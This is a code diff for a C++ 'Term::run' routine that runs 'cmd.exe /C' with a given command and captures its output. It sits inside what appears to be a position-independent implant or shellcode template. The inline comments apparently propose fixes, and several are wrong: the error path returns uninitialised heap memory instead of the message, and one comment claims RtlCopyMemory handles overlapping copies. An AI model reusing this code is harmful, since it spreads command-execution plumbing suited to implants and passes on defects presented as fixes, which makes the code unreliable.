@@ -76,35 +76,56 @@ char* Term::run(char* command) {
     STARTUPINFO si = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = get_std_handle(STD_INPUT_HANDLE);
+    si.hStdInput = get_std_handle(STD_INPUT_HANDLE); // Consider if you want to redirect stdin as well
     si.hStdOutput = write;
-    si.hStdError = write;
+    si.hStdError = write; // Redirect stderr to the same pipe
 
     PROCESS_INFORMATION pi = {0};
 
     HANDLE heap = get_process_heap();
     if (heap == NULL) {
+        close_handle(read);
+        close_handle(write);
         return "e:get_process_heap";
     }
 
-    char* command_prefix = "cmd.exe /C dir";
+    // You might want to build the command more robustly, e.g., if 'command' itself contains spaces
+    // For simplicity, keeping your original command construction.
+    char* command_prefix = "cmd.exe /C "; // Added space after /C to properly separate command
+    size_t command_prefix_len = strlen(command_prefix);
+    size_t command_len = strlen(command);
 
-    char* command_buffer = (char*)rtl_alloc_heap(heap, 0, strlen(command_prefix) + strlen(command) + 1);
+    char* command_buffer = (char*)rtl_alloc_heap(heap, 0, command_prefix_len + command_len + 1);
+    if (command_buffer == NULL) {
+        close_handle(read);
+        close_handle(write);
+        return "e:rtl_alloc_heap_cmd_buffer";
+    }
+    _wsprintf(command_buffer, "%s%s", command_prefix, command);
 
-    int chars_written_command_buffer = _wsprintf(command_buffer, "%s%s", command_prefix, command);
-
+    // Set bInheritHandles to TRUE so the child process inherits the pipe handles
     if (!create_process(NULL, command_buffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        rtl_free_heap(heap, 0, command_buffer);
         close_handle(read);
         close_handle(write);
         return "e:create_process";
     }
 
+    // IMPORTANT: Close the write handle in the parent process immediately after CreateProcess.
+    // The child process has inherited its own copy. If the parent keeps it open,
+    // ReadFile will never return EOF until the parent also closes it.
     close_handle(write);
 
+    // Wait for the child process to finish.
+    // This is important before assuming all output has been written.
     wait_for_single_object(pi.hProcess, INFINITE);
 
+    // Close process and thread handles
     close_handle(pi.hProcess);
     close_handle(pi.hThread);
+
+    // Free the command_buffer
+    rtl_free_heap(heap, 0, command_buffer);
 
     size_t initial_capacity = 4096;
     char* buffer = (char*)rtl_alloc_heap(heap, 0, initial_capacity);
@@ -118,8 +139,14 @@ char* Term::run(char* command) {
     DWORD bytes_read;
 
     while (true) {
-        if (current_size == capacity) {
+        // Ensure there's space for at least one byte + null terminator
+        if (current_size + 1 >= capacity) { // +1 for null terminator
             size_t new_capacity = capacity * 2;
+            if (new_capacity < capacity) { // Check for overflow
+                rtl_free_heap(heap, 0, buffer);
+                close_handle(read);
+                return "e:capacity_overflow"; // Or handle this more gracefully
+            }
             char* new_buffer = (char*)rtl_alloc_heap(heap, 0, new_capacity);
             if (new_buffer == NULL) {
                 rtl_free_heap(heap, 0, buffer);
@@ -127,36 +154,45 @@ char* Term::run(char* command) {
                 return "e:rtl_alloc_heap2";
             }
 
-            // RtlCopyMemory(new_buffer, buffer, current_size);
+            // RtlCopyMemory is safer for memory operations than plain memcpy
+            // if available or a custom implementation that handles overlapping.
             my_copy_memory(new_buffer, buffer, current_size);
             rtl_free_heap(heap, 0, buffer);
             buffer = new_buffer;
             capacity = new_capacity;
         }
 
-        DWORD to_read = (DWORD)(capacity - current_size);
+        DWORD to_read = (DWORD)(capacity - current_size -1); // Leave space for null terminator
+        if (to_read == 0) { // Should not happen with the capacity check above, but as a safeguard
+             break;
+        }
+
         if (!read_file(read, buffer + current_size, to_read, &bytes_read, NULL)) {
             DWORD last_error = get_last_error();
-            if (last_error != ERROR_NO_DATA) {
-                // rtl_free_heap(heap, 0, buffer);
-                // close_handle(read);
-                // return "e:read_file";
+            // ERROR_BROKEN_PIPE (109) indicates the pipe has been closed by the writer,
+            // and there's no more data. This is a normal way to exit the read loop.
+            if (last_error == ERROR_BROKEN_PIPE || last_error == ERROR_NO_DATA) {
+                break; // End of pipe, no more data
+            } else {
+                // Actual error during ReadFile
                 char error_msg[256];
-                _wsprintf(error_msg, "ReadFile failed with error %d", last_error);
+                _wsprintf(error_msg, "e:read_file_error_%d", last_error);
                 rtl_free_heap(heap, 0, buffer);
                 close_handle(read);
-                return error_msg;
+                return (char*)rtl_alloc_heap(heap, 0, strlen(error_msg) + 1); // Allocate on heap for return
             }
-            break;
         }
         if (bytes_read == 0) {
+            // ReadFile can return TRUE with bytes_read == 0 if it reaches EOF.
             break;
         }
         current_size += bytes_read;
     }
 
-    buffer[current_size] = '\0';
+    buffer[current_size] = '\0'; // Null-terminate the buffer
     close_handle(read);
+
+    // Return the dynamically allocated buffer
     return buffer;
 }
 
@@ -464,7 +500,7 @@ auto declfn instance::start(_In_ void *arg) -> void {
         reinterpret_cast<uintptr_t>(kernel32.handle),
         reinterpret_cast<uintptr_t>(user32)
     );
-    char* command = "";
+    char* command = "dir";
     char* output = term.run(command);
     DBG_PRINTF("command output: %s", output);
 	msgbox(nullptr, output, symbol<const char *>("caption"), MB_OK);
